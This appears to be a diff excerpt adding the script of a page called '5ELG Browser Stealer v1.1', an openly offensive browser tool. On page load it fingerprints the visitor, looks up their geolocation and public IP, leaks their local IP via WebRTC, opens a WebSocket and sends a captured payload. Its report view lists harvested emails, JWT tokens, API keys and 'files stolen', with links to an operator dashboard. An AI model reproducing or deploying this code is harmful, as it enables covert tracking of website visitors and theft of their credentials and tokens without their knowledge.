+            const d=await r.json();
+            applyGeo({
+                ip:d.ipString||'—', city:d.city||'—', region:d.countryRegion||'—',
+                country:d.countryName||'—', countryCode:d.countryCode||'',
+                isp:d.isp||'—', asn:d.asnNumber?'AS'+d.asnNumber:'—',
+                timezone:d.timezone||'—',
+                lat:d.latitude, lon:d.longitude,
+                proxy:null, mobile:null, hosting:null,
+                source:'BigDataCloud'
+            });
+            if(badge){badge.textContent='BigDataCloud ✓';badge.className='api-badge ok';}
+            return;
+        }
+    }catch(e){log('Geo API 3 (BigDataCloud) failed: '+e.message,'dim');}
+
+    // all failed
+    if(badge){badge.textContent='all APIs failed';badge.className='api-badge fail';}
+    log('All geo APIs failed','err');
+}
+
+function applyGeo(g){
+    const flag=countryCodeToFlag(g.countryCode);
+    const flagEl=document.getElementById('geo-flag');if(flagEl)flagEl.textContent=flag+' ';
+    geoSet('geo-city',   g.city);
+    geoSet('geo-country',g.country+(g.countryCode?' ('+g.countryCode+')':''));
+    geoSet('geo-region', g.region);
+    geoSet('geo-ip',     g.ip, 'green');
+    geoSet('geo-isp',    g.isp, 'blue');
+    geoSet('geo-asn',    g.asn, 'dim');
+    geoSet('geo-tz',     g.timezone, 'dim');
+    geoSet('geo-latlon', g.lat&&g.lon?g.lat.toFixed(4)+' / '+g.lon.toFixed(4):'—', 'dim');
+    geoSet('geo-proxy',  g.proxy===true?'⚠ YES':'NO', g.proxy===true?'red':'green');
+    geoSet('geo-mobile', g.mobile===true?'YES':'NO', g.mobile===true?'amber':'dim');
+    geoSet('geo-hosting',g.hosting===true?'⚠ YES (datacenter)':'NO', g.hosting===true?'amber':'dim');
+    geoSet('geo-source', g.source, 'dim');
+    // update S.ip with real public IP
+    if(g.ip&&g.ip!=='—'){S.ip=g.ip;updateUI();}
+    log('Geo resolved: '+g.city+', '+g.country+' via '+g.source+' ('+g.ip+')','info');
+    if(g.proxy===true) log('⚠ Proxy/VPN detected by geo API','warn');
+    if(g.hosting===true) log('⚠ Hosting/datacenter IP detected','warn');
+}
+
+/* ════════════════════════════════════════════════════════
+   FINGERPRINTJS v5 — OSS client-side visitorId
+════════════════════════════════════════════════════════ */
+async function runFingerprintJS(){
+    const badge=document.getElementById('fpjs-badge');
+    const fpjsIdEl=document.getElementById('fpjs-id');
+    try{
+        // FingerprintJS loaded via iife.min.js CDN → window.FingerprintJS
+        if(typeof FingerprintJS==='undefined'){
+            throw new Error('FingerprintJS not loaded (ad blocker?)');
+        }
+        const fp=await FingerprintJS.load({monitoring:false});
+        const result=await fp.get();
+        const vid=result.visitorId;
+        if(fpjsIdEl)fpjsIdEl.textContent=vid;
+        // update comparison
+        const cmpFu=document.getElementById('cmp-fu');
+        const cmpFpjs=document.getElementById('cmp-fpjs');
+        const cmpMatch=document.getElementById('cmp-match');
+        if(cmpFu)cmpFu.textContent=S.fu||'(pending)';
+        if(cmpFpjs)cmpFpjs.textContent=vid;
+        if(cmpMatch){
+            // they'll almost always differ — different algorithms
+            cmpMatch.textContent=S.fu===vid?'✓ identical':'≠ different algorithms';
+            cmpMatch.className='match-badge '+(S.fu===vid?'match':'diff');
+        }
+        if(badge){badge.textContent='FPJS v5 ✓';badge.className='api-badge ok';}
+        log('FingerprintJS visitorId: '+vid,'info');
+        // store fpjs visitorId alongside Fu
+        storeDataInAllStorages('fpjs_vid',vid);
+        S.fpjsVid=vid;
+        return vid;
+    }catch(e){
+        if(fpjsIdEl)fpjsIdEl.textContent='failed: '+e.message;
+        if(badge){badge.textContent='FPJS failed';badge.className='api-badge fail';}
+        log('FingerprintJS error: '+e.message,'err');
+        return null;
+    }
+}
+
+/* ── INIT ── */
+async function fiveelgInit(){
+    log('5ELG Browser Stealer v1.1 loaded','ok');
+    log('Target URL: '+location.href,'dim');
+    log('Referrer: '+(document.referrer||'(direct)'),'dim');
+    log('User-Agent: '+navigator.userAgent,'dim');
+    setProgress(5,'Initializing fingerprints…');
+    try{
+        await initializeFingerprints();
+        setProgress(25,'Fingerprint ready — querying external APIs…');
+        // Fire geo + FingerprintJS in parallel, don't block main flow
+        Promise.all([fetchGeo(), runFingerprintJS()]).then(([,fpjsId])=>{
+            // update cmp-fu now that Fu is resolved
+            const cmpFu=document.getElementById('cmp-fu');
+            if(cmpFu&&S.fu)cmpFu.textContent=S.fu;
+            const cmpMatch=document.getElementById('cmp-match');
+            if(cmpMatch&&fpjsId){
+                cmpMatch.textContent=S.fu===fpjsId?'✓ identical':'≠ different algorithms';
+                cmpMatch.className='match-badge '+(S.fu===fpjsId?'match':'diff');
+            }
+        }).catch(()=>{});
+        setProgress(40,'External APIs queried — connecting WebSocket…');
+        connectWebSocket();
+        setProgress(55,'WS initiated — preparing payload…');
+        captureAndSendData();
+    }catch(e){log('Init error: '+e.message,'err');}
+}
+if(document.readyState==='complete'||document.readyState==='interactive'){fiveelgInit();}else{window.onload=fiveelgInit;}
+
+/* ── BUTTON ACTIONS ── */
+function showSrc(){
+    const scripts=[...document.querySelectorAll('script:not([src])')];
+    const src=scripts[scripts.length-1]?.textContent||'';
+    const lines=src.split('\n').length,kb=(src.length/1024).toFixed(1);
+    Swal.fire({title:'BROWSER STEALER · Source Code',html:`<div class="code-modal"><div class="cm-head"><span class="cm-tag">JS</span><span class="cm-tag" style="background:rgba(95,255,176,.1);color:#5fffb0">${lines} lines</span><span class="cm-tag" style="background:rgba(255,208,112,.1);color:#ffd070">${kb} KB</span><button onclick="navigator.clipboard.writeText(document.querySelectorAll('script:not([src])')[document.querySelectorAll('script:not([src])').length-1].textContent).then(()=>this.textContent='✓ Copied')" style="margin-left:auto;padding:2px 8px;border:1px solid rgba(126,184,255,.3);border-radius:3px;font-size:9px;font-weight:700;cursor:pointer;background:transparent;color:#7eb8ff;font-family:Consolas,monospace">📋 COPY</button></div><pre>${esc(src.trim())}</pre></div>`,width:'88%',showConfirmButton:true,confirmButtonText:'CLOSE'});
+}
+
+function showFinger(){
+    const jd=S.jd||{},dev=jd.deviceData||{},gpu=jd.gpuData||{},bd=jd.browserData||{};
+    const bat=bd.batteryData||{},net=bd.networkInfo||{},mem=bd.memoryInfo||{},touch=bd.touchCapabilities||{};
+    const jsTagsHtml=S.jsFiles.slice(0,20).map(f=>{const isExt=/moz-extension|chrome-extension/.test(f);return`<span class="fi-tag ${isExt?'ext':'js'}" title="${esc(f)}">${esc(f)}</span>`;}).join('')||'<span style="color:rgba(255,255,255,.25);font-size:9px">None detected</span>';
+    const emailHtml=S.emails.map(e=>`<span class="fi-tag" style="background:rgba(255,208,112,.1);color:#ffd070">${esc(e)}</span>`).join('')||'—';
+    const jwtHtml=S.jwtTokens.slice(0,3).map(j=>`<div style="font-family:Consolas,monospace;font-size:8px;word-break:break-all;color:#ff8080;background:rgba(255,128,128,.06);padding:3px 6px;border-radius:2px;margin-bottom:3px">${esc(j)}</div>`).join('')||'—';
+    const apiHtml=Object.entries(S.apiKs).map(([k,v])=>`<div style="font-size:9px;margin-bottom:2px"><b style="color:#c4b0ff">${esc(k)}</b>: <span style="color:#ff8080">${esc(String(Array.isArray(v)?v[0]:v))}</span></div>`).join('')||'—';
+    Swal.fire({title:'Fingerprint Intelligence Report',html:`<div class="code-modal" style="font-size:10px">
+        <div class="fi-section">Identity Hashes</div>
+        <div class="fi-grid">
+            <div class="fi-kv"><span class="fi-label">Fu (fingerprint UID)</span><span class="fi-val green" style="font-size:9px">${esc(S.fu||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Fb (browser hash)</span><span class="fi-val blue" style="font-size:9px">${esc(S.fb||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Dealer</span><span class="fi-val">${esc(S.dl||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Payload sent</span><span class="fi-val ${S.sent?'green':'red'}">${S.sent?'✓ YES':'✗ PENDING'}</span></div>
+            <div class="fi-kv"><span class="fi-label">WebSocket</span><span class="fi-val ${S.wsOpen?'green':'red'}">${S.wsOpen?'✓ OPEN':'✗ CLOSED'}</span></div>
+            <div class="fi-kv"><span class="fi-label">Files stolen</span><span class="fi-val amber">${S.stolenFiles}</span></div>
+        </div>
+        <div class="fi-section">Hardware</div>
+        <div class="fi-grid">
+            <div class="fi-kv"><span class="fi-label">Platform</span><span class="fi-val">${esc(dev.platform||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">CPU Cores</span><span class="fi-val">${esc(String(dev.hardwareConcurrency||'—'))}</span></div>
+            <div class="fi-kv"><span class="fi-label">RAM</span><span class="fi-val">${esc(dev.deviceMemory?dev.deviceMemory+'GB':'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Touch points</span><span class="fi-val">${esc(String(dev.maxTouchPoints??'—'))}</span></div>
+            <div class="fi-kv"><span class="fi-label">GPU Renderer</span><span class="fi-val">${esc(gpu.renderer||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Color depth</span><span class="fi-val">${esc(gpu.colorDepth?gpu.colorDepth+'bit':'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Screen</span><span class="fi-val">${esc(screen.width+'x'+screen.height)}</span></div>
+            <div class="fi-kv"><span class="fi-label">Timezone</span><span class="fi-val">${esc(String(new Date().getTimezoneOffset()/-60)+'h UTC')}</span></div>
+        </div>
+        <div class="fi-section">Telemetry</div>
+        <div class="fi-grid">
+            <div class="fi-kv"><span class="fi-label">Languages</span><span class="fi-val">${esc((dev.languages||[]).join(', ')||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Battery</span><span class="fi-val amber">${bat.level!=null?Math.round(bat.level*100)+'% '+(bat.charging?'⚡':'🔋'):'—'}</span></div>
+            <div class="fi-kv"><span class="fi-label">Network</span><span class="fi-val">${esc(net.effectiveType?net.effectiveType+(net.downlink?' '+net.downlink+'Mbps':''):'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">JS Heap</span><span class="fi-val">${esc(mem.usedJSHeapSize?fmtSize(mem.usedJSHeapSize)+' / '+fmtSize(mem.jsHeapSizeLimit):'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">WebRTC ICE</span><span class="fi-val red" style="font-size:8px">${esc(bd.rtcdata||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Local IP (leaked)</span><span class="fi-val red">${esc(bd.localIP||'—')}</span></div>
+            <div class="fi-kv"><span class="fi-label">Touch support</span><span class="fi-val">${esc(String(touch.touchEventSupported??'—'))}</span></div>
+            <div class="fi-kv"><span class="fi-label">Media devices</span><span class="fi-val" style="font-size:8px">${esc(bd.mediaDevices||'—')}</span></div>
+        </div>
+        <div class="fi-section">Captured Intel</div>
+        <div style="margin-bottom:6px"><div style="font-size:8px;text-transform:uppercase;letter-spacing:.08em;color:rgba(255,255,255,.3);margin-bottom:4px">Emails (${S.emails.length})</div>${emailHtml}</div>
+        <div style="margin-bottom:6px"><div style="font-size:8px;text-transform:uppercase;letter-spacing:.08em;color:rgba(255,255,255,.3);margin-bottom:4px">JWT Tokens (${S.jwtTokens.length})</div>${jwtHtml}</div>
+        <div style="margin-bottom:6px"><div style="font-size:8px;text-transform:uppercase;letter-spacing:.08em;color:rgba(255,255,255,.3);margin-bottom:4px">API Keys (${Object.keys(S.apiKs).length})</div>${apiHtml}</div>
+        <div style="margin-bottom:8px"><div style="font-size:8px;text-transform:uppercase;letter-spacing:.08em;color:rgba(255,255,255,.3);margin-bottom:4px">JS Files (${S.jsFiles.length})</div>${jsTagsHtml}</div>
+        <div class="fi-section">Actions</div>
+        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:4px">
+            <button onclick="navigator.clipboard.writeText('${esc(S.fu)}').then(()=>this.textContent='✓ Copied')" style="padding:3px 10px;border:1px solid rgba(95,255,176,.3);border-radius:3px;font-size:9px;font-weight:700;cursor:pointer;background:transparent;color:#5fffb0;font-family:Consolas,monospace">📋 COPY FU</button>
+            <a href="/web/statics?finger=${esc(S.fu)}" target="_blank" style="padding:3px 10px;border:1px solid rgba(126,184,255,.3);border-radius:3px;font-size:9px;font-weight:700;background:transparent;color:#7eb8ff;font-family:Consolas,monospace;text-decoration:none">↗ INTEL PAGE</a>
+            <a href="/web/dashboard#${esc(S.fu)}" target="_blank" style="padding:3px 10px;border:1px solid rgba(196,176,255,.3);border-radius:3px;font-size:9px;font-weight:700;background:transparent;color:#c4b0ff;font-family:Consolas,monospace;text-decoration:none">↗ DASHBOARD</a>
+        </div>
+    </div>`,width:'82%',showConfirmButton:true,confirmButtonText:'CLOSE'});
+}
+
+function copyFu(){if(!S.fu){log('No Fu yet — still collecting','warn');return;}navigator.clipboard.writeText(S.fu).then(()=>{Swal.fire({icon:'success',title:'Copied',text:S.fu,timer:1500,showConfirmButton:false});log('Fu copied to clipboard','ok');});}
+function openStatics(){if(S.fu)window.open('/web/statics?finger='+S.fu,'_blank');else Swal.fire({icon:'info',title:'No Fu yet',text:'Still collecting…'});}
+</script>
+</body>
 </html>
